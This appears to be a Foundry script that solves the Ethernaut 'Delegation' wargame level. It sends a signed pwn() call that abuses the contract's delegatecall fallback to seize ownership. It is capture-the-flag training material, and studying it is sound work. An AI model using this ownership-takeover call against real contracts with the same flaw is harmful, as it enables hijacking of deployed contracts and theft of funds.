// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {IDelegation, IDelegate} from "../../../src/ethernaut/06-delegation/IDelegation.sol";

contract Delegation is Script {

    address delegationInstanceAddress = vm.envAddress("L06_DELEGATION_INSTANCE");
    uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");

    function run() public {
        // Load contract at address
        IDelegation delegation = IDelegation(delegationInstanceAddress);

        // Send attack call
        vm.broadcast(privateKey);
        delegation.pwn();
    }
}